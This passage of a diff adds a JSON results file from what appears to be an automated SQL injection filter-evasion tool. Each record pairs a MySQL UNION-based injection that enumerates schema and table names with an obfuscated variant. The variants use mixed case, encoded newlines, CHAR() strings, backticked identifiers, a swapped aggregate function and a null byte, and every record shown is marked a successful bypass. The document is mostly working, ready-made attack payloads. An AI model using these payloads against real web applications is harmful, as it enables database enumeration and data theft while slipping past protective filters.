+      "final_result": "SUCCESS",
+      "initial_bypass": false,
+      "sequence": [
+        "ident_backtick",
+        "agg_swap",
+        "hex_to_char",
+        "case",
+        "newline",
+        "func_sp_nbsp",
+        "null_byte"
+      ]
+    },
+    {
+      "payload_id": "u0197",
+      "original_payload": "-1' UNION SELECT (SELECT GROUP_CONCAT(table_schema,0x2e,table_name) FROM information_schema.tables WHERE table_schema NOT IN (0x696e666f726d6174696f6e5f736368656d61,0x6d7973716c,0x706572666f726d616e63655f736368656d61)),'SEQSQLI_START','SEQSQLI_END'#",
+      "success": true,
+      "final_payload": "-1'%0aUNIoN%0aSeleCt%0a(SELECt%0aJSON_ARRAYAGG(CONCAT(TaBLE_schema,CHAR(46),tAbLE_name))%0afrOm%0a`inFOrmaTIoN_SChEMa`.`Tables`%0aWheRE%0aTAblE_schema%0aNOT%0aIN%0a(CHAR(105,110,102,111,114,109,97,116,105,111,110,95,115,99,104,101,109,97),CHAR(109,121,115,113,108),CHAR(112,101,114,102,111,114,109,97,110,99,101,95,115,99,104,101,109,97))),'SEQSQLI_START','SEQSQLI_END';%00",
+      "steps": 7,
+      "requests_used": 7,
+      "final_status": 200,
+      "final_result": "SUCCESS",
+      "initial_bypass": false,
+      "sequence": [
+        "ident_backtick",
+        "hex_to_char",
+        "case",
+        "newline",
+        "func_sp_nbsp",
+        "null_byte",
+        "agg_swap"
+      ]
+    },
+    {
+      "payload_id": "u0198",
+      "original_payload": "-1' UNION ALL SELECT (SELECT GROUP_CONCAT(table_schema,0x2e,table_name) FROM information_schema.tables WHERE table_schema NOT IN (0x696e666f726d6174696f6e5f736368656d61,0x6d7973716c,0x706572666f726d616e63655f736368656d61)),'SEQSQLI_START','SEQSQLI_END'#",
+      "success": true,
+      "final_payload": "-1'%0aUNiON%0aALL%0aSElect%0a(SeLecT%0aJSON_ARRAYAGG(CONCAT(tABlE_schema,CHAR(46),tABLe_name))%0aFroM%0a`inFormAtiOn_SCHemA`.`TABLes`%0awhERe%0aTAble_schema%0aNOT%0aIN%0a(CHAR(105,110,102,111,114,109,97,116,105,111,110,95,115,99,104,101,109,97),CHAR(109,121,115,113,108),CHAR(112,101,114,102,111,114,109,97,110,99,101,95,115,99,104,101,109,97))),'SEQSQLI_START','SEQSQLI_END';%00",
+      "steps": 7,
+      "requests_used": 7,
+      "final_status": 200,
+      "final_result": "SUCCESS",
+      "initial_bypass": false,
+      "sequence": [
+        "ident_backtick",
+        "hex_to_char",
+        "case",
+        "newline",
+        "func_sp_nbsp",
+        "null_byte",
+        "agg_swap"
+      ]
+    },
+    {
+      "payload_id": "u0199",
+      "original_payload": "-1' UNION DISTINCT SELECT (SELECT GROUP_CONCAT(table_schema,0x2e,table_name) FROM information_schema.tables WHERE table_schema NOT IN (0x696e666f726d6174696f6e5f736368656d61,0x6d7973716c,0x706572666f726d616e63655f736368656d61)),'SEQSQLI_START','SEQSQLI_END'#",
+      "success": true,
+      "final_payload": "-1'%0aUNIoN%0aDISTINCT%0asElECt%0a(selECT%0aJSON_ARRAYAGG(CoNcaT(TabLE_schema,CHAR(46),TAble_name))%0aFrOm%0a`InforMatIon_sCHEMa`.`TaBlEs`%0awhere%0aTABle_schema%0aNOT%0aIN%0a(CHAR(105,110,102,111,114,109,97,116,105,111,110,95,115,99,104,101,109,97),CHAR(109,121,115,113,108),CHAR(112,101,114,102,111,114,109,97,110,99,101,95,115,99,104,101,109,97))),'SEQSQLI_START','SEQSQLI_END';%00",
+      "steps": 7,
+      "requests_used": 7,
+      "final_status": 200,
+      "final_result": "SUCCESS",
+      "initial_bypass": false,
+      "sequence": [
+        "ident_backtick",
+        "agg_swap",
+        "hex_to_char",
+        "case",
+        "newline",
+        "func_sp_nbsp",
+        "null_byte"
+      ]
+    },
+    {
+      "payload_id": "u0200",
+      "original_payload": "-1' UNION DISTINCTROW SELECT (SELECT GROUP_CONCAT(table_schema,0x2e,table_name) FROM information_schema.tables WHERE table_schema NOT IN (0x696e666f726d6174696f6e5f736368656d61,0x6d7973716c,0x706572666f726d616e63655f736368656d61)),'SEQSQLI_START','SEQSQLI_END'#",
+      "success": true,
+      "final_payload": "-1'%0auNIoN%0aDISTINCTROW%0aSelecT%0a(seLecT%0aJSON_ARRAYAGG(CoNcaT(taBle_schema,CHAR(46),TAble_name))%0afRom%0a`iNfoRMATIOn_SChEmA`.`tabLes`%0awherE%0atabLe_schema%0aNOT%0aIN%0a(CHAR(105,110,102,111,114,109,97,116,105,111,110,95,115,99,104,101,109,97),CHAR(109,121,115,113,108),CHAR(112,101,114,102,111,114,109,97,110,99,101,95,115,99,104,101,109,97))),'SEQSQLI_START','SEQSQLI_END';%00",
+      "steps": 7,
+      "requests_used": 7,
+      "final_status": 200,
+      "final_result": "SUCCESS",
+      "initial_bypass": false,
+      "sequence": [
+        "ident_backtick",
+        "agg_swap",
+        "hex_to_char",
+        "case",
+        "newline",
+        "func_sp_nbsp",
+        "null_byte"
+      ]
+    },
+    {
+      "payload_id": "u0201",
+      "original_payload": "-1' UNION SELECT (SELECT GROUP_CONCAT(table_schema,0x2e,table_name) FROM information_schema.tables WHERE table_schema NOT IN (0x696e666f726d6174696f6e5f736368656d61,0x6d7973716c,0x706572666f726d616e63655f736368656d61)),'SEQSQLI_START','SEQSQLI_END'--+",
+      "success": true,
+      "final_payload": "-1'%0auNION%0asELeCT%0a(sElect%0aJSON_ARRAYAGG(CONCAT(tAble_schema,CHAR(46),tAbLe_name))%0afroM%0a`INFoRmAtION_SchEma`.`TabLes`%0awhere%0aTABlE_schema%0aNOT%0aIN%0a(CHAR(105,110,102,111,114,109,97,116,105,111,110,95,115,99,104,101,109,97),CHAR(109,121,115,113,108),CHAR(112,101,114,102,111,114,109,97,110,99,101,95,115,99,104,101,109,97))),'SEQSQLI_START','SEQSQLI_END';%00",
+      "steps": 7,
+      "requests_used": 7,
+      "final_status": 200,
+      "final_result": "SUCCESS",
+      "initial_bypass": false,
+      "sequence": [
+        "ident_backtick",
+        "hex_to_char",
+        "case",
+        "newline",
+        "func_sp_nbsp",
+        "null_byte",
+        "agg_swap"
+      ]
+    },
+    {
+      "payload_id": "u0202",
+      "original_payload": "-1' UNION ALL SELECT (SELECT GROUP_CONCAT(table_schema,0x2e,table_name) FROM information_schema.tables WHERE table_schema NOT IN (0x696e666f726d6174696f6e5f736368656d61,0x6d7973716c,0x706572666f726d616e63655f736368656d61)),'SEQSQLI_START','SEQSQLI_END'--+",
+      "success": true,
+      "final_payload": "-1'%0aUNIOn%0aALL%0aSEleCt%0a(selECt%0aJSON_ARRAYAGG(CONCAT(TablE_schema,CHAR(46),taBLe_name))%0aFROm%0a`INFORmAtIon_SchemA`.`TaBLEs`%0awHeRe%0aTAbLE_schema%0aNOT%0aIN%0a(CHAR(105,110,102,111,114,109,97,116,105,111,110,95,115,99,104,101,109,97),CHAR(109,121,115,113,108),CHAR(112,101,114,102,111,114,109,97,110,99,101,95,115,99,104,101,109,97))),'SEQSQLI_START','SEQSQLI_END';%00",
+      "steps": 7,
+      "requests_used": 7,
+      "final_status": 200,
+      "final_result": "SUCCESS",
+      "initial_bypass": false,
+      "sequence": [
+        "ident_backtick",
+        "hex_to_char",
+        "case",
+        "newline",
+        "func_sp_nbsp",
+        "null_byte",
+        "agg_swap"
+      ]
+    },
+    {
+      "payload_id": "u0203",
+      "original_payload": "-1' UNION DISTINCT SELECT (SELECT GROUP_CONCAT(table_schema,0x2e,table_name) FROM information_schema.tables WHERE table_schema NOT IN (0x696e666f726d6174696f6e5f736368656d61,0x6d7973716c,0x706572666f726d616e63655f736368656d61)),'SEQSQLI_START','SEQSQLI_END'--+",
+      "success": true,
+      "final_payload": "-1'%0aunioN%0aDISTINCT%0aSEleCt%0a(SeLECt%0aJSON_ARRAYAGG(cONCat(taBle_schema,CHAR(46),taBle_name))%0aFrOm%0a`InFOrMATioN_sCHemA`.`tAbLEs`%0awheRE%0aTAble_schema%0aNOT%0aIN%0a(CHAR(105,110,102,111,114,109,97,116,105,111,110,95,115,99,104,101,109,97),CHAR(109,121,115,113,108),CHAR(112,101,114,102,111,114,109,97,110,99,101,95,115,99,104,101,109,97))),'SEQSQLI_START','SEQSQLI_END';%00",
+      "steps": 7,
+      "requests_used": 7,
+      "final_status": 200,
+      "final_result": "SUCCESS",
+      "initial_bypass": false,
+      "sequence": [
+        "ident_backtick",
+        "agg_swap",
+        "hex_to_char",
+        "case",
+        "newline",
+        "func_sp_nbsp",
+        "null_byte"
+      ]
+    },
+    {
+      "payload_id": "u0204",
+      "original_payload": "-1' UNION DISTINCTROW SELECT (SELECT GROUP_CONCAT(table_schema,0x2e,table_name) FROM information_schema.tables WHERE table_schema NOT IN (0x696e666f726d6174696f6e5f736368656d61,0x6d7973716c,0x706572666f726d616e63655f736368656d61)),'SEQSQLI_START','SEQSQLI_END'--+",
+      "success": true,
+      "final_payload": "-1'%0aUNion%0aDISTINCTROW%0aseLECT%0a(sElEcT%0aJSON_ARRAYAGG(CONCAt(TaBLE_schema,CHAR(46),TaBle_name))%0afROM%0a`InfoRMation_SCheMa`.`TabLes`%0awheRE%0aTaBlE_schema%0aNOT%0aIN%0a(CHAR(105,110,102,111,114,109,97,116,105,111,110,95,115,99,104,101,109,97),CHAR(109,121,115,113,108),CHAR(112,101,114,102,111,114,109,97,110,99,101,95,115,99,104,101,109,97))),'SEQSQLI_START','SEQSQLI_END';%00",
+      "steps": 7,
+      "requests_used": 7,
+      "final_status": 200,
+      "final_result": "SUCCESS",
+      "initial_bypass": false,
+      "sequence": [
+        "ident_backtick",
+        "agg_swap",
+        "hex_to_char",
+        "case",
+        "newline",
+        "func_sp_nbsp",
+        "null_byte"
+      ]
+    },
+    {
+      "payload_id": "u0205",
+      "original_payload": "-1' UNION SELECT (SELECT CONCAT(0x7c,GROUP_CONCAT(DISTINCT table_name),0x7c) FROM information_schema.tables WHERE table_schema=DATABASE()),'SEQSQLI_START','SEQSQLI_END'-- -",
+      "success": true,
+      "final_payload": "-1'%0aUNiOn%0aSElEct%0a(sElEcT%0aconCAt(CHAR(124),JSON_ARRAYAGG(tAbLE_name),CHAR(124))%0aFroM%0a`InFOrMAtIOn_sChEma`.`tabLEs`%0aWHErE%0aTaBle_schema=daTaBAsE%a0()),'SEQSQLI_START','SEQSQLI_END';%00",
+      "steps": 7,
+      "requests_used": 8,
+      "final_status": 200,
+      "final_result": "SUCCESS",
+      "initial_bypass": false,
+      "sequence": [
+        "ident_backtick",
+        "agg_swap",
+        "hex_to_char",
+        "case",
+        "newline",
+        "func_sp_nbsp",
+        "null_byte"
+      ]
+    },
+    {
+      "payload_id": "u0206",
+      "original_payload": "-1' UNION ALL SELECT (SELECT CONCAT(0x7c,GROUP_CONCAT(DISTINCT table_name),0x7c) FROM information_schema.tables WHERE table_schema=DATABASE()),'SEQSQLI_START','SEQSQLI_END'-- -",
+      "success": true,
+      "final_payload": "-1'%0auNioN%0aALL%0aselecT%0a(seLeCt%0aCOncAT(CHAR(124),JSON_ARRAYAGG(TAbLe_name),CHAR(124))%0afrom%0a`InfoRMation_sChemA`.`TABLEs`%0aWherE%0ataBle_schema=datABasE%a0()),'SEQSQLI_START','SEQSQLI_END';%00",
+      "steps": 7,
+      "requests_used": 8,
+      "final_status": 200,
+      "final_result": "SUCCESS",
+      "initial_bypass": false,
+      "sequence": [
+        "ident_backtick",
+        "agg_swap",
+        "hex_to_char",
+        "case",
+        "newline",
+        "func_sp_nbsp",
+        "null_byte"
+      ]
+    },
+    {
+      "payload_id": "u0207",
+      "original_payload": "-1' UNION DISTINCT SELECT (SELECT CONCAT(0x7c,GROUP_CONCAT(DISTINCT table_name),0x7c) FROM information_schema.tables WHERE table_schema=DATABASE()),'SEQSQLI_START','SEQSQLI_END'-- -",
+      "success": true,
+      "final_payload": "-1'%0auNion%0aDISTINCT%0aSeleCT%0a(SelEcT%0aCONCAt(CHAR(124),JSON_ARRAYAGG(TablE_name),CHAR(124))%0afROM%0a`InfoRmatioN_scHEmA`.`taBles`%0awhEre%0atABLe_schema=DAtAbase%a0()),'SEQSQLI_START','SEQSQLI_END';%00",
+      "steps": 7,
+      "requests_used": 8,
+      "final_status": 200,
+      "final_result": "SUCCESS",
+      "initial_bypass": false,
+      "sequence": [
+        "ident_backtick",
+        "agg_swap",
+        "hex_to_char",
+        "case",
+        "newline",
+        "func_sp_nbsp",
+        "null_byte"
+      ]
+    },
+    {
+      "payload_id": "u0208",
+      "original_payload": "-1' UNION DISTINCTROW SELECT (SELECT CONCAT(0x7c,GROUP_CONCAT(DISTINCT table_name),0x7c) FROM information_schema.tables WHERE table_schema=DATABASE()),'SEQSQLI_START','SEQSQLI_END'-- -",
+      "success": true,
+      "final_payload": "-1'%0aunioN%0aDISTINCTROW%0aseLEct%0a(seLeCT%0aCOncAT(CHAR(124),JSON_ARRAYAGG(tABlE_name),CHAR(124))%0aFROM%0a`INFORMaTIon_SCHeMA`.`taBLEs`%0aWhere%0atabLE_schema=DATabaSe%a0()),'SEQSQLI_START','SEQSQLI_END';%00",
+      "steps": 7,
+      "requests_used": 8,
+      "final_status": 200,
+      "final_result": "SUCCESS",
+      "initial_bypass": false,
+      "sequence": [
+        "ident_backtick",
+        "agg_swap",
+        "hex_to_char",
+        "case",
+        "newline",
+        "func_sp_nbsp",
+        "null_byte"
+      ]
+    },
+    {
+      "payload_id": "u0209",
+      "original_payload": "-1' UNION SELECT (SELECT CONCAT(0x7c,GROUP_CONCAT(DISTINCT table_name),0x7c) FROM information_schema.tables WHERE table_schema=DATABASE()),'SEQSQLI_START','SEQSQLI_END'#",
+      "success": true,
+      "final_payload": "-1'%0aUnIon%0asElEcT%0a(sELECT%0acOnCAt(CHAR(124),JSON_ARRAYAGG(tabLe_name),CHAR(124))%0aFrom%0a`InfoRMaTION_sCHema`.`TaBlEs`%0aWhEre%0ataBLE_schema=DatAbASE%a0()),'SEQSQLI_START','SEQSQLI_END';%00",
+      "steps": 7,
+      "requests_used": 8,
+      "final_status": 200,
+      "final_result": "SUCCESS",
+      "initial_bypass": false,
+      "sequence": [
+        "ident_backtick",
+        "agg_swap",
+        "hex_to_char",
+        "case",
+        "newline",
+        "func_sp_nbsp",
+        "null_byte"
+      ]
+    },
+    {
+      "payload_id": "u0210",
+      "original_payload": "-1' UNION ALL SELECT (SELECT CONCAT(0x7c,GROUP_CONCAT(DISTINCT table_name),0x7c) FROM information_schema.tables WHERE table_schema=DATABASE()),'SEQSQLI_START','SEQSQLI_END'#",
+      "success": true,
+      "final_payload": "-1'%0auNIoN%0aALL%0aSEleCT%0a(sElECT%0acoNCat(CHAR(124),JSON_ARRAYAGG(TaBlE_name),CHAR(124))%0afrOM%0a`iNFORmatioN_schema`.`TabLes`%0aWheRE%0aTAbLe_schema=daTaBAsE%a0()),'SEQSQLI_START','SEQSQLI_END';%00",
+      "steps": 7,
+      "requests_used": 8,
+      "final_status": 200,
+      "final_result": "SUCCESS",
+      "initial_bypass": false,
+      "sequence": [
+        "ident_backtick",
+        "agg_swap",
+        "hex_to_char",
+        "case",
+        "newline",
+        "func_sp_nbsp",
+        "null_byte"
+      ]
+    },
+    {
+      "payload_id": "u0211",
+      "original_payload": "-1' UNION DISTINCT SELECT (SELECT CONCAT(0x7c,GROUP_CONCAT(DISTINCT table_name),0x7c) FROM information_schema.tables WHERE table_schema=DATABASE()),'SEQSQLI_START','SEQSQLI_END'#",
+      "success": true,
+      "final_payload": "-1'%0aUnIon%0aDISTINCT%0aSeLecT%0a(sElECt%0acoNCAT(CHAR(124),JSON_ARRAYAGG(tabLE_name),CHAR(124))%0aFRom%0a`InfORMAtIoN_scHEmA`.`TabLEs`%0aWhEre%0atabLe_schema=DATaBasE%a0()),'SEQSQLI_START','SEQSQLI_END';%00",
+      "steps": 7,
+      "requests_used": 8,
+      "final_status": 200,
+      "final_result": "SUCCESS",
+      "initial_bypass": false,
+      "sequence": [
+        "ident_backtick",
+        "agg_swap",
+        "hex_to_char",
+        "case",
+        "newline",
+        "func_sp_nbsp",
+        "null_byte"
+      ]
+    },
+    {
+      "payload_id": "u0212",
+      "original_payload": "-1' UNION DISTINCTROW SELECT (SELECT CONCAT(0x7c,GROUP_CONCAT(DISTINCT table_name),0x7c) FROM information_schema.tables WHERE table_schema=DATABASE()),'SEQSQLI_START','SEQSQLI_END'#",
+      "success": true,
+      "final_payload": "-1'%0aUNiOn%0aDISTINCTROW%0aseleCt%0a(sElECT%0acONCAT(CHAR(124),JSON_ARRAYAGG(TAbLe_name),CHAR(124))%0afRom%0a`inFoRmatiOn_sChEma`.`tAbLEs`%0awhEre%0atAble_schema=DATAbAsE%a0()),'SEQSQLI_START','SEQSQLI_END';%00",
+      "steps": 7,
+      "requests_used": 8,
+      "final_status": 200,
+      "final_result": "SUCCESS",
+      "initial_bypass": false,
+      "sequence": [
+        "ident_backtick",
+        "agg_swap",
+        "hex_to_char",
+        "case",
+        "newline",
+        "func_sp_nbsp",
+        "null_byte"
+      ]
+    },
+    {
+      "payload_id": "u0213",
+      "original_payload": "-1' UNION SELECT (SELECT CONCAT(0x7c,GROUP_CONCAT(DISTINCT table_name),0x7c) FROM information_schema.tables WHERE table_schema=DATABASE()),'SEQSQLI_START','SEQSQLI_END'--+",
+      "success": true,
+      "final_payload": "-1'%0auNiON%0aSelECt%0a(seLECt%0aCoNCaT(CHAR(124),JSON_ARRAYAGG(TAbLe_name),CHAR(124))%0aFroM%0a`InfORmAtiOn_schEMa`.`taBles`%0aWHERe%0atABLe_schema=DaTAbASE%a0()),'SEQSQLI_START','SEQSQLI_END';%00",
+      "steps": 7,
+      "requests_used": 8,
+      "final_status": 200,
+      "final_result": "SUCCESS",
+      "initial_bypass": false,
+      "sequence": [
+        "ident_backtick",
+        "agg_swap",
+        "hex_to_char",
+        "case",
+        "newline",
+        "func_sp_nbsp",
+        "null_byte"
+      ]
+    },
+    {
+      "payload_id": "u0214",
+      "original_payload": "-1' UNION ALL SELECT (SELECT CONCAT(0x7c,GROUP_CONCAT(DISTINCT table_name),0x7c) FROM information_schema.tables WHERE table_schema=DATABASE()),'SEQSQLI_START','SEQSQLI_END'--+",
+      "success": true,
+      "final_payload": "-1'%0auNIon%0aALL%0aSElecT%0a(selecT%0acONCat(CHAR(124),JSON_ARRAYAGG(taBlE_name),CHAR(124))%0afROm%0a`InforMAtIOn_SCHeMA`.`TAbles`%0awHERe%0ataBLE_schema=DaTABAsE%a0()),'SEQSQLI_START','SEQSQLI_END';%00",
+      "steps": 7,
+      "requests_used": 8,
+      "final_status": 200,
+      "final_result": "SUCCESS",
+      "initial_bypass": false,
+      "sequence": [
+        "ident_backtick",
+        "agg_swap",
+        "hex_to_char",
+        "case",
+        "newline",
+        "func_sp_nbsp",
+        "null_byte"
+      ]
+    },
+    {
+      "payload_id": "u0215",
+      "original_payload": "-1' UNION DISTINCT SELECT (SELECT CONCAT(0x7c,GROUP_CONCAT(DISTINCT table_name),0x7c) FROM information_schema.tables WHERE table_schema=DATABASE()),'SEQSQLI_START','SEQSQLI_END'--+",
+      "success": true,
+      "final_payload": "-1'%0aUNIoN%0aDISTINCT%0aSElECt%0a(SelEct%0acOncaT(CHAR(124),JSON_ARRAYAGG(Table_name),CHAR(124))%0aFROm%0a`inFoRMAtIon_schEma`.`tAbLEs`%0awHERe%0aTablE_schema=DaTAbaSe%a0()),'SEQSQLI_START','SEQSQLI_END';%00",
+      "steps": 7,
+      "requests_used": 8,
+      "final_status": 200,
+      "final_result": "SUCCESS",
+      "initial_bypass": false,
+      "sequence": [
+        "ident_backtick",
+        "agg_swap",
+        "hex_to_char",
+        "case",
+        "newline",
+        "func_sp_nbsp",
+        "null_byte"
+      ]
+    },
+    {
+      "payload_id": "u0216",
+      "original_payload": "-1' UNION DISTINCTROW SELECT (SELECT CONCAT(0x7c,GROUP_CONCAT(DISTINCT table_name),0x7c) FROM information_schema.tables WHERE table_schema=DATABASE()),'SEQSQLI_START','SEQSQLI_END'--+",
+      "success": true,
+      "final_payload": "-1'%0auNION%0aDISTINCTROW%0aSeLEct%0a(SeLeCT%0aCONcat(CHAR(124),JSON_ARRAYAGG(tabLE_name),CHAR(124))%0afROM%0a`infORmAtioN_ScHEMa`.`tabLes`%0aWHERe%0ataBle_schema=DaTaBaSE%a0()),'SEQSQLI_START','SEQSQLI_END';%00",
+      "steps": 7,
+      "requests_used": 8,
+      "final_status": 200,
+      "final_result": "SUCCESS",
+      "initial_bypass": false,
+      "sequence": [
+        "ident_backtick",
+        "agg_swap",
+        "hex_to_char",
+        "case",
+        "newline",
+        "func_sp_nbsp",
+        "null_byte"
+      ]
+    }
+  ]
+}
